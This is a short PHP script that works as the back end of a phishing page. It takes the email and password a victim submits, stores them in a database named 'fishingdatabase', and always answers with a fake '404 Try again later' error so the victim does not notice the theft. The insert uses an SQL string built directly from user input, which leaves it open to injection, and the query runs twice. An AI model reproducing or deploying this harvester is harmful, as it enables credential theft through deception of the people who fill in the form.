<?php

//Create a conection with database
$con = mysqli_connect("localhost", "root", "", "fishingdatabase");

//Set Variebles for the input
$mail = $_POST['mail'];
$passward = $_POST['pasward'];

//Create a MySQL command to INSERT data into data table
$sql = "INSERT INTO fishingdb(mail, pasward) VALUES ('$mail', '$passward')";
$result = mysqli_query($con, $sql);

//Now Insert data into database
//Check if data is inserted or not
if (!mysqli_query($con, $sql)) {
	echo "<h1>Error! 404</h1><br><h4> Try again later </h4>";
} else{
	echo "<h1>Error! 404</h1><br><h4> Try again later </h4>";
}
?>